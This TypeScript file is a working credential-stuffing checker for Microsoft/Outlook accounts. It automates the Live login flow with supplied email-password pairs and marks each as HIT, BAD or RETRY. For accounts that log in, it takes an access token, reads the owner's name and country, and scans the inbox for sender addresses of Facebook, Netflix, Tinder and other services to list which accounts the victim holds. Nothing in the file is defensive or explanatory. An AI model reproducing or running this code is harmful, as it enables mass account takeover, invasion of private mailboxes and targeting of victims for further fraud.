import axios from "axios";
import { v4 as uuidv4 } from "uuid";

const services: Record<string, { sender: string | string[] }> = {
  Facebook: { sender: "security@facebookmail.com" },
  Instagram: { sender: "security@mail.instagram.com" },
  Twitter: { sender: "info@x.com" },
  LinkedIn: { sender: "security-noreply@linkedin.com" },
  Netflix: { sender: "info@account.netflix.com" },
  Google: { sender: "no-reply@accounts.google.com" },
  Microsoft: { sender: "account-security-noreply@accountprotection.microsoft.com" },
  Tinder: { sender: "noreply@gotinder.com" },
  "Match.com": { sender: ["mailer@sc2.connect.match.com", "donotreply@sc2.connect.match.com"] },
  Hinge: { sender: ["hello@hinge.co", "hello@mail.hinge.co"] },
  RevealMe: { sender: "no-reply@email.revealme.com" },
};

export interface CheckResult {
  email: string;
  password: string;
  status: "HIT" | "BAD" | "RETRY";
  name?: string;
  country?: string;
  linkedServices?: string[];
}

function getFlag(countryName: string): string {
  try {
    const countryMap: Record<string, string> = {
      "United States": "US",
      "United Kingdom": "GB",
      Canada: "CA",
      Australia: "AU",
      Germany: "DE",
      France: "FR",
      Spain: "ES",
      Italy: "IT",
      Brazil: "BR",
      Mexico: "MX",
      Japan: "JP",
      China: "CN",
      India: "IN",
      Russia: "RU",
      Netherlands: "NL",
      Sweden: "SE",
      Norway: "NO",
      Denmark: "DK",
      Finland: "FI",
      Poland: "PL",
      Turkey: "TR",
      "South Korea": "KR",
      Indonesia: "ID",
      Philippines: "PH",
      Thailand: "TH",
      Vietnam: "VN",
      Malaysia: "MY",
      Singapore: "SG",
      UAE: "AE",
      "Saudi Arabia": "SA",
      Egypt: "EG",
      Nigeria: "NG",
      "South Africa": "ZA",
      Argentina: "AR",
      Chile: "CL",
      Colombia: "CO",
      Peru: "PE",
    };
    const code = countryMap[countryName] || "UN";
    return code
      .split("")
      .map((c) => String.fromCodePoint(0x1f1e6 - 65 + c.charCodeAt(0)))
      .join("");
  } catch {
    return "🏳";
  }
}

async function captureData(
  email: string,
  _password: string,
  token: string,
  cid: string
): Promise<{ name: string; country: string; linkedServices: string[] }> {
  const result = { name: "Unknown", country: "Unknown", linkedServices: [] as string[] };

  try {
    const headers = {
      "User-Agent": "Outlook-Android/2.0",
      Authorization: `Bearer ${token}`,
      "X-AnchorMailbox": `CID:${cid}`,
    };

    const profileResponse = await axios.get(
      "https://substrate.office.com/profileb2/v2.0/me/V1Profile",
      { headers, timeout: 30000 }
    );

    const names = profileResponse.data?.names || [];
    result.name = names[0]?.displayName || "Unknown";

    const accounts = profileResponse.data?.accounts || [];
    const countryName = accounts[0]?.location || "Unknown";
    const flag = getFlag(countryName);
    result.country = `${flag} ${countryName}`;

    const inboxUrl = `https://outlook.live.com/owa/${email}/startupdata.ashx?app=Mini&n=0`;
    const inboxHeaders = {
      "x-owa-sessionid": cid,
      authorization: `Bearer ${token}`,
      "user-agent":
        "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36",
    };

    const inboxResponse = await axios.post(inboxUrl, "", {
      headers: inboxHeaders,
      timeout: 30000,
    });
    const inboxText = inboxResponse.data;

    const linkedServices: string[] = [];
    for (const [serviceName, serviceInfo] of Object.entries(services)) {
      const senders = serviceInfo.sender;
      if (Array.isArray(senders)) {
        if (senders.some((sender) => inboxText.includes(sender))) {
          linkedServices.push(`✓ ${serviceName}`);
        }
      } else {
        if (inboxText.includes(senders)) {
          linkedServices.push(`✓ ${serviceName}`);
        }
      }
    }
    result.linkedServices = linkedServices;
  } catch {
    // silently fail
  }

  return result;
}

export async function checkAccount(email: string, password: string): Promise<CheckResult> {
  const result: CheckResult = { email, password, status: "RETRY" };

  try {
    const session = axios.create({
      maxRedirects: 0,
      validateStatus: () => true,
    });

    // Step 1: Get identity provider
    const r1 = await session.get(
      `https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress=${email}`,
      {
        headers: { "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9)" },
        timeout: 15000,
      }
    );

    if (
      ["Neither", "Both", "Placeholder", "OrgId"].some((x) => r1.data.includes(x)) ||
      !r1.data.includes("MSAccount")
    ) {
      result.status = "BAD";
      return result;
    }

    // Step 2: OAuth authorize
    const r2 = await session.get(
      `https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint=${email}&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D`,
      {
        headers: { "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" },
        timeout: 15000,
      }
    );

    const urlMatch = r2.data.match(/urlPost":"([^"]+)"/);
    const ppftMatch = r2.data.match(/name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"/);

    if (!urlMatch || !ppftMatch) {
      result.status = "BAD";
      return result;
    }

    const postUrl = urlMatch[1].replace(/\\/g, "/");
    const ppft = ppftMatch[1];

    // Step 3: Login
    const loginData = `i13=1&login=${encodeURIComponent(email)}&loginfmt=${encodeURIComponent(
      email
    )}&type=11&LoginOptions=1&passwd=${encodeURIComponent(
      password
    )}&ps=2&PPFT=${encodeURIComponent(ppft)}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960`;

    const r3 = await session.post(postUrl, loginData, {
      headers: {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        Origin: "https://login.live.com",
        Referer: r2.request?.res?.responseUrl || r2.config?.url || "",
      },
      timeout: 15000,
    });

    if (
      ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials"].some(
        (x) => r3.data.includes(x)
      )
    ) {
      result.status = "BAD";
      return result;
    }

    if (["identity/confirm", "Abuse", "signedout", "locked"].some((url) => r3.data.includes(url))) {
      result.status = "BAD";
      return result;
    }

    const location = r3.headers?.location || "";
    const codeMatch = location.match(/code=([^&]+)/);

    if (!codeMatch) {
      result.status = "BAD";
      return result;
    }

    // Step 4: Exchange code for token
    const tokenData = {
      client_id: "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
      redirect_uri: "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
      grant_type: "authorization_code",
      code: codeMatch[1],
      scope: "profile openid offline_access https://outlook.office.com/M365.Access",
    };

    const r4 = await session.post(
      "https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
      new URLSearchParams(tokenData).toString(),
      {
        headers: { "Content-Type": "application/x-www-form-urlencoded" },
        timeout: 15000,
      }
    );

    if (r4.status !== 200 || !r4.data?.access_token) {
      result.status = "BAD";
      return result;
    }

    const accessToken = r4.data.access_token;

    // Get cookies from response
    const cookies = r4.headers["set-cookie"] || [];
    let mspcid = "";
    for (const cookie of cookies) {
      const match = cookie.match(/MSPCID=([^;]+)/);
      if (match) {
        mspcid = match[1];
        break;
      }
    }

    const cid = mspcid ? mspcid.toUpperCase() : uuidv4().toUpperCase();

    // Capture data
    const captured = await captureData(email, password, accessToken, cid);
    result.status = "HIT";
    result.name = captured.name;
    result.country = captured.country;
    result.linkedServices = captured.linkedServices;

    return result;
  } catch {
    result.status = "RETRY";
    return result;
  }
}
